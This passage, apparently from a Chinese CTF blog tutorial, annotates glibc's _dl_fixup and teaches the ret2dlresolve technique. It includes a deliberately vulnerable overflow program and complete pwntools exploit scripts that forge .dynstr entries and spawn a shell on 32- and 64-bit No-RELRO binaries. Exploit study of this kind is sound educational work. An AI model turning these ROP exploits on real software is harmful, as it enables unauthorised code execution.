class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//这里判断函数是否被解析过，如果(sym-&gt;st_other)&amp;0x03结果为0，说明没有解析过，不属于STV_PROTECTED、STV_HIDDEN或者STV_INTERNAL其中任何一种。</span></span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">//这部分获取version信息，我们可以发现version是使用我们的r_info进行赋值，如果我们r_info的重定位入口符号下标异常从而导致ndx数值异常，很可能导致l_versions[ndx]数组越界到不可读位置导致程序崩溃。</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"><span class="comment">//这一部分先通过strtab（字符串表的基地址）加上st_name（字符串对应字符串表的下标）得到函数的字符串，从已经装载的共享库找到最终符号的地址，得到符号对其重定位，加上libc的装载地址得到最终地址，保存在value中</span></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    <span class="comment">//这部分是使用elf_machine_fixup_plt对函数地址进行修正，将函数真实地址写入got表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们总结一下刚刚分析好的_dl_runtime_resolve过程</p><ol><li>首先获取后面需要使用的地址：<ul><li>通过宏D_PTR获取获得动态链接符号表的地址，动态链接字符串</li><li>获取.rel.plt的地址，将.rel.plt的地址与reloc_offset相加，得到该函数的ELF32_Rel的结构体指针</li><li>得到r_info中里保存的重定位入口符号在符号表的下标，从而获取函数对应ELF32_sym的指针。</li><li>基地址l-&gt;l_addr加上got表在共享对象的偏移reloc-&gt;r_offset，得到我们要修改的got表所在的位置。</li></ul></li><li>接下来做一些检查：<ul><li>检查r_info中的重定位入口类型是否是R_386_JMP_SLOT</li><li>判断函数是否被解析过，是否属于属于STV_PROTECTED、STV_HIDDEN或者STV_INTERNAL其中任何一种。</li></ul></li><li>紧接着获取version信息，通过strtab（字符串表的基地址）加上st_name（字符串对应字符串表的下标）得到函数的字符串，从已经装载的共享库找到最终符号的地址，得到符号对其重定位，加上libc的装载地址得到最终地址，保存在value中，最后对函数地址进行修正，将函数真实地址写入got表</li></ol><p>了解了_dl_runtime_resolve的基本过程，接下来我们来看看攻击的手法吧</p><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>从最直接的角度去想直接去修改.dynsym、.dynstr或者是修改.rel.plt，但是存在一些问题，我们会发现这些segment是不可写的，也就是说我们无法通过修改它们达到我们的目的。</p><ol><li><p>让我们换个思路，既然不能直接改写这些segment，是否可以间接控制到它们那？看看_dl_runtime_resolve过程的第一步，所有的地址索引都是从<strong>.dynamic</strong>开始的,也就是说，我们如果控制了.dynamic也就控制了整个动态链接的过程，也就可以实现执行目标代码。比如我们通过其劫持到strtab，我们既可以根据st_name的偏移伪造出字符串表，比如将write的偏移地方写上system，这样就可以到达我们执行目的函数的目标。但是这种方法的局限性较强，得No RELRO才行</p></li><li><p>再者我们先伪造出<strong>Elf32_Rel</strong>和<strong>Elf32_Sym</strong>两个结构体，并传入的虚假的reloc_offset参数，我们对reloc_offset做一个修改使得其位置发生偏移，通过虚假的reloc_arg使得程序流读取我们伪造的结构体，进而取得我们伪造的偏移量，最终取得伪造的函数字符串。这样也可以达到我们的目的，但是要注意这种方法存在一定的问题，其不能用于x64的架构在上面分析的代码里有这样一段</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在64位条件下，我们程序的bss段是被映射到0x600000的，那么我们伪造的.dynsym也会在这个地址之后，而d_ptr是在0x400000，这样在取下标的时候很可能会很大从而取到二者之间的不可读区域</p></li><li><p>我们还是看看_dl_runtime_resolve的第一步，可以看到除了.dynamic之外，我们索引也通过D_PTR，也就是说如果我们<strong>伪造link_map</strong>，也就可以做到控制程序到目的函数。</p></li></ol><h2 id="攻击实战"><a href="#攻击实战" class="headerlink" title="攻击实战"></a>攻击实战</h2><h3 id="32位下通过修改-dynamic进行攻击（NO-RELOR）"><a href="#32位下通过修改-dynamic进行攻击（NO-RELOR）" class="headerlink" title="32位下通过修改.dynamic进行攻击（NO RELOR）"></a>32位下通过修改.dynamic进行攻击（NO RELOR）</h3><p>我们先实验一下第一种攻击方式，由于没有现成的程序，所以我改写了一下XMan2016的level3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -fno-stack-protector -m32 -z norelro -no-pie level3.c -o level3_norelro_32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x200</span>u);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来checksec一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815210044087.png" alt="checksec"></p><p>确定是没有开RELRO的</p><p>先看一下偏移大小</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815211051440.png" alt="偏移"></p><p>我们先确定一下后面要使用到的一些地址</p><p>接下来我们要寻找到read存放跳转到_dl_runtime_resolve的地址，也就是got表一开始填写的地址，可以使用gdb来查看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210817110724393.png" alt="通过got.plt寻找代码"></p><p>这样我们就得到了<code>push 0x0 jmp _dl_runtime_resolve</code>的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049040</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br></pre></td></tr></table></figure><p>接下来还需要通过gdb来寻找dynstr地址在dynamic中保存的地址,由于我没有找到这个api,也不知道有没有,只能采用下面的方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr<span class="comment">#获取dynamic的地址</span></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr<span class="comment">#获取dynstr的地址</span></span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>调用gdb</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211031209.png" alt="查看地址"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211053995.png" alt="调用gdb"></p><p>我们可以看到该地址位于<em>0x804b208</em>,或者还有一个办法</p><p>使用<code>readelf -d level3_norelro_32</code>来查看.dynamic</p><p>数一数STRTAB的偏移</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211622145.png" alt="查看偏移"></p><p>那么其地址即为<code>dynamic_addr+str_offset*0x8+4</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr<span class="comment">#获取bss的地址</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span><span class="comment">#在bss上做一个偏移为我们的栈基址</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="comment">#获取.dynstr的内容</span></span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)<span class="comment">#替换read和system</span></span><br></pre></td></tr></table></figure><p>调用read为我们后面在栈里写入做一个准备,然后做一个栈迁移,将栈迁移到.bss段,而这里需要注意的是我们栈是向下生长的，我们需要给其留足空间，防止其进入不可写的页，这里卡了我好久，一开始留出了0x100的空间，结果到后面一直出问题，调试了一个下午，这里要<strong>感谢帮助我和我一起讨论的师傅们，还要特别感谢ha1vk师傅帮我点出这个问题</strong>，要不是他们我可能再用一个晚上都解决不了这个问题。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)<span class="comment">#这里是为了将下面三个参数弹出栈而调用下面的gadget</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)<span class="comment">#将栈迁移到.bss段上</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来就是改写.dynamic在里面写入我们伪造的.dynstr和“sh”，然后通过伪造的符号表让read调用system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)<span class="comment">#ebp</span></span><br><span class="line">payload+=p32(read_plt)<span class="comment">#调用read向.dynamic读入虚假的地址</span></span><br><span class="line">payload+=p32(read_dl)<span class="comment">#传参调用_dl_runtime_resolve，使其调用system</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span><span class="comment">#这里的参数实际上是p32(fake_stack+fake_str_offset)，但是这里会调用失败然后;结束命令，参数变为sh</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>这样就执行了system(‘sh’)。</p><p>其实最后这里如果觉得不舒服,想一次性直接调用system(‘/bin/sh\x00’)，也可以依照上面第一次rop的方法调用:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">4</span>)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(<span class="built_in">len</span>(payload)+<span class="number">8</span>+<span class="built_in">len</span>(fake_dynstr)+fake_stack)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049044</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下通过修改-dynamic进行攻击（NO-RELOR）"><a href="#64位下通过修改-dynamic进行攻击（NO-RELOR）" class="headerlink" title="64位下通过修改.dynamic进行攻击（NO RELOR）"></a>64位下通过修改.dynamic进行攻击（NO RELOR）</h3><p>代码依旧是上面的代码，但是我们的编译命令要稍作更改<code>gcc -fno-stack-protector -z norelro -no-pie level3.c -o level3_norelro_32</code>这样就i可以完成编译了</p><p>64位下攻击更为便捷，基本上只需要一条rop链就可以完成我们的攻击，流程和之前几乎一样，甚至更为简单，这里就不过多进行赘述，直接上exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x0000000000401040</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">dynamic_dynstr_addr=<span class="number">0x403220</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">fake_dynstr_len=<span class="built_in">len</span>(fake_dynstr)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#向.bss段写入虚假的strtab还有/bin/sh\x00</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(dynamic_dynstr_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#改写.dynamic的dynstr指针</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bss_addr+fake_dynstr_len)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(read_dl)<span class="comment">#传参调用_dl_runtime_resolve，使其调用system</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=fake_dynstr+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(bss_addr)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="32位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）"><a href="#32位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）" class="headerlink" title="32位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）"></a>32位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）</h3><p>还是上面的程序不过这里我们做一些修改，使其RELRO保护变为Partial RELRO。编译命令为</p><p><code>gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie  leve3.c -o level3_partialrelro_32</code>在这种情况下我们之前的攻击方式就会变得无效，因为.dynamic会变得不可写，所以我们不能再用同样的方法攻击。这里就要采用我们攻击思路的第二条了</p><p>我们先展示一下Elf32_Rel和Elf32_Sym的结构是怎么样的，以便后面伪造</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info; </span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>结构体中的成员我们在之前蒋的静态链接介绍过，二者都占有一个字长即为4个字节</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span 